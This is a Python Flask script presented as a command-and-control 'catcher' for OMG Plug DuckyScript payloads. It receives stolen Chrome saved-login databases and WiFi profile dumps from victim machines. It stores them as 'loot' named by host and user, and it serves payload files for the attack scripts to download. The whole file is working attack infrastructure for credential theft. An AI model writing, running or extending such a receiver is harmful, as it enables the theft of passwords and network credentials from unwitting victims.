#!/usr/bin/env python3
# ~/hexbox/c2/catcher.py — credential / exfil receiver for OMG Plug payloads

from flask import Flask, request, send_file
from pathlib import Path
import base64, binascii, json, os

app = Flask(__name__)


def _loot_base() -> Path:
    cfg = Path(__file__).parent.parent / "config.json"
    if cfg.exists():
        with open(cfg) as f:
            d = json.load(f)
        return Path(os.path.expanduser(
            d.get("hexbox", {}).get("loot_dir", "~/hexbox/loot")))
    return Path.home() / "hexbox" / "loot"


LOOT     = _loot_base()
PAYLOADS = Path(__file__).parent.parent / "payloads"


@app.route("/upload", methods=["POST"])
def upload_chrome():
    """Receive base64-encoded Chrome Login Data from browser_exfil.ducky."""
    host = request.form.get("host", "unk")
    user = request.form.get("user", "unk")
    raw  = request.form.get("data", "")
    if not raw:
        return "missing data", 400
    try:
        data = base64.b64decode(raw)
    except (binascii.Error, ValueError):
        return "invalid base64", 400
    dest = LOOT / "creds" / f"{host}_{user}_chrome.db"
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_bytes(data)
    print(f"[+] Chrome DB from {host}\\{user} → {dest}")
    return "OK"


@app.route("/wifi", methods=["POST"])
def upload_wifi():
    """Receive WiFi profile dump from wifi_steal.ducky."""
    host = request.form.get("h", "unk")
    data = request.form.get("d", "")
    dest = LOOT / "creds" / f"{host}_wifi.txt"
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_text(data, encoding="utf-8")
    print(f"[+] WiFi profiles from {host} → {dest}")
    return "OK"


@app.route("/serve/<name>")
def serve_file(name: str):
    """Serve a payload file so DuckyScript payloads can download it."""
    safe = Path(name).name
    path = PAYLOADS / safe
    if path.is_file():
        return send_file(str(path))
    return "Not found", 404


if __name__ == "__main__":
    print(f"[+] Catcher listening on 0.0.0.0:8000")
    print(f"[+] Saving loot to {LOOT}/creds/")
    app.run("0.0.0.0", 8000, debug=False)
